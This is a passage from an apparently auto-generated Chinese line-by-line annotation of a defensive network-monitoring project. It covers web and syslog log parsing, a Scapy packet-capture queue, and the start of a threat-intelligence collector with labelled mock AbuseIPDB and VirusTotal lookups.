| 76 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 77 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            size_raw = match.group('size')` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            response_size = 0 if size_raw == '-' else int(size_raw)` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            method = match.group('method')` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tail = line[match.end() :]` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            user_agent = ''` |
| 83 | 条件判断：满足条件时进入对应分支。 | `            if tail.strip():` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                tail_m = self.ACCESS_LOG_COMBINED_TAIL.match(tail)` |
| 85 | 条件判断：满足条件时进入对应分支。 | `                if tail_m:` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    user_agent = tail_m.group('user_agent')` |
| 87 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'timestamp': match.group('time'),` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'src_ip': match.group('ip'),` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'url': match.group('url'),` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'method': method,` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'http_method': method,` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'status_code': int(match.group('status')),` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'response_size': response_size,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'user_agent': user_agent,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                'log_type': 'web',` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 98 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (ValueError, TypeError) as exc:` |
| 99 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(f"[LogCollector] Web 日志字段转换失败: {exc}")` |
| 100 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 函数定义：声明 `_parse_system_log` 的输入、处理逻辑和返回结果。 | `    def _parse_system_log(self, line: str) -> Optional[dict]:` |
| 103 | 文档字符串：说明当前模块、类或函数的职责。 | `        """解析 /var/log/auth.log 等 syslog 风格日志"""` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parts = line.split(maxsplit=3)` |
| 105 | 条件判断：满足条件时进入对应分支。 | `        if len(parts) < 4:` |
| 106 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        process_field = parts[3]` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        process_name = (` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `            process_field.split(':')[0] if ':' in process_field else process_field` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 111 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'timestamp': f"{parts[0]} {parts[1]} {parts[2]}",` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'process': process_name,` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'message': process_field,` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'log_type': 'system',` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 119 | 函数定义：声明 `last_position` 的输入、处理逻辑和返回结果。 | `    def last_position(self) -> int:` |
| 120 | 文档字符串：说明当前模块、类或函数的职责。 | `        """当前读取位置（用于监控与断点续传）"""` |
| 121 | 返回结果：把处理后的值交回调用方。 | `        return self._last_position` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 函数定义：声明 `reset_position` 的输入、处理逻辑和返回结果。 | `    def reset_position(self) -> None:` |
| 124 | 文档字符串：说明当前模块、类或函数的职责。 | `        """重置读取位置为 0（调试或重新全量扫描时使用）"""` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_position = 0` |

## `src/collectors/packet_collector.py`

- 类型：后端采集
- 行数：138

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `网络流量采集器 - 基于 Scapy 的实时数据包采集模块` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §3.3 流量采集架构` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `职责：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 使用 Scapy sniff 接口在后台线程中实时抓取网络流量` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 解析 IP / TCP / UDP / ICMP 层的关键字段` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 将解析后的数据包放入线程安全队列，供下游模块消费` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 当队列满时丢弃最新包并记录告警（保证系统不被 OOM 打爆）` |
| 10 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 11 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import queue` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Optional` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from scapy.all import ICMP, IP, TCP, UDP, sniff` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from scapy.packet import Packet` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 类定义：声明 `PacketCollector`，封装相关状态与行为。 | `class PacketCollector:` |
| 26 | 文档字符串：说明当前模块、类或函数的职责。 | `    """实时网络流量采集器"""` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, interface: Optional[str] = None, queue_size: int = 10000):` |
| 29 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 30 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            interface: 网卡名称，None 表示由 Scapy 自动选择默认网卡` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            queue_size: 数据包缓冲队列大小，超出后新包会被丢弃` |
| 33 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.interface = interface` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.packet_queue: queue.Queue = queue.Queue(maxsize=queue_size)` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._running: bool = False` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._thread: Optional[threading.Thread] = None` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._drop_count: int = 0` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 函数定义：声明 `_packet_callback` 的输入、处理逻辑和返回结果。 | `    def _packet_callback(self, packet: Packet) -> None:` |
| 41 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Scapy 回调函数，解析每个数据包并投递到队列"""` |
| 42 | 条件判断：满足条件时进入对应分支。 | `        if not packet.haslayer(IP):` |
| 43 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip_layer = packet[IP]` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parsed = {` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'timestamp': datetime.now().isoformat(),` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': ip_layer.src,` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'dst_ip': ip_layer.dst,` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'protocol': 'OTHER',` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_port': 0,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'dst_port': 0,` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'packet_len': len(packet),` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'ttl': ip_layer.ttl,` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'tcp_flags': '',` |
| 56 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 条件判断：满足条件时进入对应分支。 | `        if packet.haslayer(TCP):` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tcp_layer = packet[TCP]` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['protocol'] = 'TCP'` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['src_port'] = int(tcp_layer.sport)` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['dst_port'] = int(tcp_layer.dport)` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['tcp_flags'] = str(tcp_layer.flags)` |
| 64 | 条件分支：前面条件不满足时继续判断。 | `        elif packet.haslayer(UDP):` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            udp_layer = packet[UDP]` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['protocol'] = 'UDP'` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['src_port'] = int(udp_layer.sport)` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['dst_port'] = int(udp_layer.dport)` |
| 69 | 条件分支：前面条件不满足时继续判断。 | `        elif packet.haslayer(ICMP):` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parsed['protocol'] = 'ICMP'` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 73 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.packet_queue.put_nowait(parsed)` |
| 74 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except queue.Full:` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._drop_count += 1` |
| 76 | 条件判断：满足条件时进入对应分支。 | `            if self._drop_count % 1000 == 0:` |
| 77 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    f"[PacketCollector] 队列已满，已丢弃 {self._drop_count} 个数据包"` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 函数定义：声明 `start` 的输入、处理逻辑和返回结果。 | `    def start(self) -> None:` |
| 82 | 文档字符串：说明当前模块、类或函数的职责。 | `        """启动抓包（在后台守护线程中运行）"""` |
| 83 | 条件判断：满足条件时进入对应分支。 | `        if self._running:` |
| 84 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[PacketCollector] 已处于运行状态，忽略重复 start 调用")` |
| 85 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._running = True` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._thread = threading.Thread(` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=self._run, name='PacketCollector', daemon=True` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._thread.start()` |
| 92 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"[PacketCollector] 已启动，接口: {self.interface or '自动'}"` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 函数定义：声明 `_run` 的输入、处理逻辑和返回结果。 | `    def _run(self) -> None:` |
| 97 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Scapy sniff 阻塞循环，stop_filter 判断退出"""` |
| 98 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `            sniff(` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                prn=self._packet_callback,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                iface=self.interface,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                store=False,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                stop_filter=lambda _pkt: not self._running,` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 105 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except PermissionError:` |
| 106 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "[PacketCollector] 抓包权限不足，请以管理员/root 身份运行"` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._running = False` |
| 110 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # pragma: no cover - 防御性日志` |
| 111 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(f"[PacketCollector] sniff 异常退出: {exc}")` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._running = False` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 函数定义：声明 `stop` 的输入、处理逻辑和返回结果。 | `    def stop(self) -> None:` |
| 115 | 文档字符串：说明当前模块、类或函数的职责。 | `        """停止抓包（标记退出并等待后台线程结束）"""` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._running = False` |
| 117 | 条件判断：满足条件时进入对应分支。 | `        if self._thread is not None:` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._thread.join(timeout=5)` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._thread = None` |
| 120 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[PacketCollector] 已停止")` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 函数定义：声明 `get_packets` 的输入、处理逻辑和返回结果。 | `    def get_packets(self, max_count: int = 100) -> List[dict]:` |
| 123 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `        从队列中取出最多 max_count 个数据包` |
| 125 | 代码语句：参与当前文件的业务流程或数据处理。 | `        队列为空时立即返回已取出的部分` |
| 126 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets: List[dict] = []` |
| 128 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(max_count):` |
| 129 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `                packets.append(self.packet_queue.get_nowait())` |
| 131 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except queue.Empty:` |
| 132 | 跳出循环：提前结束当前循环。 | `                break` |
| 133 | 返回结果：把处理后的值交回调用方。 | `        return packets` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 136 | 函数定义：声明 `drop_count` 的输入、处理逻辑和返回结果。 | `    def drop_count(self) -> int:` |
| 137 | 文档字符串：说明当前模块、类或函数的职责。 | `        """累计丢弃的数据包数（用于监控）"""` |
| 138 | 返回结果：把处理后的值交回调用方。 | `        return self._drop_count` |

## `src/collectors/threat_intel.py`

- 类型：后端采集
- 行数：582

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `威胁情报采集器：本地/DB IOC 优先，外部 Provider 兜底（有界等待、不抛异常）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `- API Key 不得进入日志或返回值` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 外部查询在独立线程中执行，主调用 \`\`wait\`\` 超时则降级，后台线程仍可能更新缓存` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `- \`\`THREAT_INTEL_MOCK=true\`\` 时外部走确定性 mock（便于离线演示）` |
| 7 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 8 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import hashlib` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from contextlib import contextmanager` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from concurrent.futures import ThreadPoolExecutor, wait` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta, timezone` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Callable, Dict, List, Optional, Set` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.ioc_providers import (` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    IOCProvider,` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    build_default_provider_registry,` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    not_configured,` |
| 24 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DOMAIN_PATTERN = re.compile(` |
| 29 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_IOC_TYPES = frozenset({"ip", "domain", "url", "file_hash", "cve"})` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 函数定义：声明 `_utc_now` 的输入、处理逻辑和返回结果。 | `def _utc_now() -> datetime:` |
| 36 | 返回结果：把处理后的值交回调用方。 | `    return datetime.now(timezone.utc)` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 函数定义：声明 `_mock_hash_int` 的输入、处理逻辑和返回结果。 | `def _mock_hash_int(seed: str, mod: int, offset: int = 0) -> int:` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    digest = hashlib.sha256(seed.encode("utf-8")).digest()` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    num = int.from_bytes(digest[:8], "big")` |
| 42 | 返回结果：把处理后的值交回调用方。 | `    return (num % mod) + offset` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 函数定义：声明 `_mock_abuseipdb` 的输入、处理逻辑和返回结果。 | `def _mock_abuseipdb(ip: str) -> Dict[str, Any]:` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    score = _mock_hash_int(f"abuseipdb:{ip}", 101)` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    countries = ("US", "CN", "RU", "BR", "DE", "NL", "GB", "SG", "JP")` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    isps = (` |
| 49 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Mock Cloud Provider",` |
| 50 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Fake Data Center, Inc.",` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Demo Hosting LLC",` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "Sample ISP Holdings",` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 54 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": True,` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "abuseipdb",` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mocked": True,` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": score >= 50,` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": score,` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "country_code": countries[_mock_hash_int(f"cc:{ip}", len(countries))],` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "usage_type": "Data Center/Web Hosting/Transit",` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "isp": isps[_mock_hash_int(f"isp:{ip}", len(isps))],` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "domain": None,` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "total_reports": _mock_hash_int(f"reports:{ip}", 500),` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "last_reported_at": _utc_now().isoformat(),` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 67 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 函数定义：声明 `_mock_virustotal` 的输入、处理逻辑和返回结果。 | `def _mock_virustotal(ioc_type: str, value: str) -> Dict[str, Any]:` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    seed = f"vt:{ioc_type}:{value.lower()}"` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    malicious = _mock_hash_int(seed + ":mal", 20)` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    suspicious = _mock_hash_int(seed + ":sus", 10)` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    harmless = _mock_hash_int(seed + ":har", 50, offset=30)` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    undetected = _mock_hash_int(seed + ":und", 20, offset=5)` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reputation = _mock_hash_int(seed + ":rep", 101, offset=-50)` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    base: Dict[str, Any] = {` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": True,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": "virustotal",` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mocked": True,` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": malicious >= 3,` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "malicious": malicious,` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "suspicious": suspicious,` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "harmless": harmless,` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "undetected": undetected,` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reputation": reputation,` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": min(100, malicious * 10) if malicious else malicious,` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 88 | 条件判断：满足条件时进入对应分支。 | `    if ioc_type == "ip":` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `        base.update(` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "country": _mock_abuseipdb(value)["country_code"],` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "as_owner": "AS65535 Mock Networks",` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "network": ".".join(value.split(".")[:3]) + ".0/24",` |
| 94 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 96 | 条件分支：前面条件不满足时继续判断。 | `    elif ioc_type == "domain":` |
| 97 | 函数调用：执行已有函数/方法完成当前步骤。 | `        base.update(` |
| 98 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "categories": {` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "Mock Vendor": "malware" if malicious >= 3 else "business",` |
| 101 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "registrar": "Mock Registrar Ltd.",` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 105 | 返回结果：把处理后的值交回调用方。 | `    return base` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 类定义：声明 `ThreatIntelCollector`，封装相关状态与行为。 | `class ThreatIntelCollector:` |
| 109 | 文档字符串：说明当前模块、类或函数的职责。 | `    """威胁情报：内存缓存 + 可选 DB 会话工厂 + Provider 注册表。"""` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
